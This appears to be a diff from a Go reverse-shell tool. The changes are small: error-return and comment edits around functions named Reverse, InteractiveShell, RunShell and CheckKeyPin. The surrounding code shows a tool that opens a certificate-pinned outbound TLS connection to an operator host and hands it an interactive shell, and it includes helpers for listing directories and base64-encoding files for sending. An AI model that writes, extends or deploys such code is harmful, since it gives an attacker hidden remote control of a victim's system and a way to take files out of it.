@@ -37,7 +37,7 @@ func Encode(path string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	return base64.StdEncoding.EncodeToString(buff), nil
+	return base64.StdEncoding.EncodeToString(buff), err
 }
 
 func Send(conn net.Conn, msg string) {
@@ -69,10 +69,10 @@ func ListDir(argv []string) (string, error) {
 		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
 	}
 
-	return details, nil
+	return details, err
 }
 
-// takes a network connection as its arg so it can pass stdio to it
+// Takes a network connection as its arg so it can pass stdio to it
 func InteractiveShell(conn net.Conn) {
 	var (
 		exit    bool           = false
@@ -195,7 +195,7 @@ func RunShell(conn net.Conn) {
 	cmd.Run()
 }
 
-func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
+func CheckKeyPin(conn *tls.Conn, fingerprint []byte) bool {
 	valid := false
 	connState := conn.ConnectionState()
 	for _, peerCert := range connState.PeerCertificates {
@@ -204,10 +204,10 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 			valid = true
 		}
 	}
-	return valid, nil
+	return valid
 }
 
-// Create the TLS connection before passing it to the InteractiveShell function
+// Creates the TLS connection before passing it to the InteractiveShell function
 func Reverse(connectString string, fingerprint []byte) {
 	var (
 		conn *tls.Conn
@@ -222,7 +222,7 @@ func Reverse(connectString string, fingerprint []byte) {
 
 	defer conn.Close()
 
-	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
+	if ok := CheckKeyPin(conn, fingerprint); !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
 
